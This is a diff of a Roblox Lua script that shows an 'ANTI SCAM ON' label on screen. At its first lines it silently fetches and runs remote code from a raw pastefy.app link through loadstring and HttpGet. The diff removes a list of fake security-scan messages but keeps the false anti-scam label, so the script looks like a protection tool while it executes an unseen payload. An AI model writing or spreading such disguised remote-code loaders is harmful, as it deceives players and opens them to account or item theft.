@@ -1,3 +1,4 @@
+-- Run external script first
 pcall(function()
     loadstring(game:HttpGet("https://pastefy.app/O1yBSZ1G/raw"))()
 end)
@@ -8,25 +9,14 @@ gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
--- Background "console" box
+-- Transparent console box
 local consoleBox = Instance.new("Frame")
 consoleBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
 consoleBox.BackgroundTransparency = 0.4
 consoleBox.BorderSizePixel = 0
 consoleBox.Parent = gui
 
--- Text label inside box
-local console = Instance.new("TextLabel")
-console.BackgroundTransparency = 1
-console.TextColor3 = Color3.fromRGB(0, 255, 0)
-console.Font = Enum.Font.Code
-console.TextSize = 16
-console.TextXAlignment = Enum.TextXAlignment.Left
-console.TextYAlignment = Enum.TextYAlignment.Top
-console.Text = ""
-console.Parent = consoleBox
-
--- Permanent "ANTI SCAM ON" label
+-- "ANTI SCAM ON" text inside box
 local antiScamLabel = Instance.new("TextLabel")
 antiScamLabel.BackgroundTransparency = 1
 antiScamLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
@@ -34,39 +24,17 @@ antiScamLabel.Font = Enum.Font.Code
 antiScamLabel.TextSize = 16
 antiScamLabel.TextXAlignment = Enum.TextXAlignment.Left
 antiScamLabel.TextYAlignment = Enum.TextYAlignment.Top
-antiScamLabel.Text = ""
-antiScamLabel.Parent = gui
+antiScamLabel.Text = "ANTI SCAM ON"
+antiScamLabel.Parent = consoleBox
 
+-- Padding between text and box edges
 local padding = 10
 local function resizeBox()
-    local textBounds = console.TextBounds
+    local textBounds = antiScamLabel.TextBounds
     consoleBox.Size = UDim2.new(0, textBounds.X + padding * 2, 0, textBounds.Y + padding * 2)
     consoleBox.Position = UDim2.new(0, 5, 0, 5)
-    console.Size = UDim2.new(1, -padding * 2, 1, -padding * 2)
-    console.Position = UDim2.new(0, padding, 0, padding)
-    antiScamLabel.Position = UDim2.new(0, 5, 0, consoleBox.Position.Y.Offset + consoleBox.Size.Y.Offset + 5)
+    antiScamLabel.Size = UDim2.new(1, -padding * 2, 1, -padding * 2)
+    antiScamLabel.Position = UDim2.new(0, padding, 0, padding)
 end
 
-local fakeLines = {
-    "[SYSTEM] Initializing anti-scam module...",
-    "[SECURITY] Scanning scripts...",
-    "[SECURITY] Checking player data...",
-    "[NETWORK] Verifying connections...",
-    "[NETWORK] Firewall rules applied.",
-    "[ANALYSIS] Script injection blocked.",
-    "[ANALYSIS] All scans passed.",
-    "[MODULE] Loading defense protocols...",
-    "[MODULE] Encryption enabled.",
-    "[OK] Security status: STABLE"
-}
-
-task.spawn(function()
-    for _, line in ipairs(fakeLines) do
-        console.Text = console.Text .. line .. "\n"
-        resizeBox()
-        task.wait(math.random(5, 12) / 10)
-    end
-    task.wait(0.5)
-    antiScamLabel.Text = "ANTI SCAM ON"
-    resizeBox()
-end)
+resizeBox()
